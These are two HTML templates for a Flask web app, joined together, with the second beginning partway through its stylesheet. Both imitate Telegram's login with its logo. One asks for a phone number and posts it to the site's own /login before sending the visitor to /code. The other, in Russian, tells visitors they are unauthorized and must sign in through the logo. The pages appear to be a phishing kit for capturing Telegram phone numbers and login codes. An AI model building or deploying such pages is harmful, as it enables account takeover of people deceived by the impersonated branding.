<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title data-i18n="welcome">Welcome</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>
<body>
    <div class="auth-container">
        <div class="glass">
            <!-- Telegram Official Logo -->
            <div style="width: 120px; height: 120px; margin-bottom: 30px; display: flex; align-items: center; justify-content: center;">
                <svg viewBox="0 0 240 240" width="120" height="120" xmlns="http://www.w3.org/2000/svg">
                    <defs>
                        <linearGradient id="tg-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
                            <stop offset="0%" style="stop-color:#0088cc;stop-opacity:1" />
                            <stop offset="100%" style="stop-color:#0088cc;stop-opacity:1" />
                        </linearGradient>
                    </defs>
                    <!-- Circle background -->
                    <circle cx="120" cy="120" r="120" fill="url(#tg-gradient)"/>
                    <!-- Telegram paper airplane -->
                    <path d="M55 130 L110 100 Q120 95 110 90 L60 65 Q55 62 55 70 L70 115 L110 100 M110 100 L170 50 Q180 45 175 55 L95 150 Q90 160 80 155 Z" 
                          fill="white" stroke="none"/>
                </svg>
            </div>

            <h1 class="auth-title" data-i18n="verify">Verification</h1>

            <form id="authForm">
                <div class="input-group">
                    <input 
                        type="tel" 
                        class="input-field" 
                        id="phone" 
                        placeholder="+1234567890"
                        data-i18n="phone_placeholder"
                        required
                    >
                </div>

                <button type="submit" class="btn btn-primary" data-i18n="send_code">
                    Send code
                </button>
            </form>

            <div id="errorMessage" class="error-message" style="display: none;"></div>
        </div>
    </div>

    <script src="{{ url_for('static', filename='i18n.js') }}"></script>
    <script>
        document.getElementById('authForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const phone = document.getElementById('phone').value;
            
            if (!phone) {
                alert(window.i18n?.t('phone_required') || 'Enter phone number');
                return;
            }

            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ phone_number: phone })
                });

                if (response.ok) {
                    window.location.href = '/code';
                } else {
                    const error = await response.json();
                    document.getElementById('errorMessage').textContent = error.error || 'Error sending code';
                    document.getElementById('errorMessage').style.display = 'block';
                }
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('errorMessage').textContent = 'Server error';
                document.getElementById('errorMessage').style.display = 'block';
            }
        });
    </script>
</body>
</html>
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 30px;
        }

        .auth-title {
            font-size: 28px;
            font-weight: 600;
            margin: 0;
            color: white;
        }

        .auth-description {
            font-size: 16px;
            color: #8e8e93;
            margin: 0;
            line-height: 1.4;
        }

        .button-hint {
            font-size: 14px;
            color: #8e8e93;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="auth-container">
        <img src="{{ url_for('static', filename='telegram-logo.svg') }}" alt="Telegram Logo" class="telegram-logo" onclick="goToAuth()">

        <div class="auth-content">
            <h1 class="auth-title">Авторизация</h1>
            <p class="auth-description">
                Вы еще не авторизованы. Вы можете<br>
                авторизоваться через Telegram Web.
            </p>

            <p class="button-hint">(нажмите на логотип для начала регистрации)</p>
        </div>
    </div>

    <script>
        function goToAuth() {
            window.location.href = '/auth';
        }
    </script>
</body>
</html>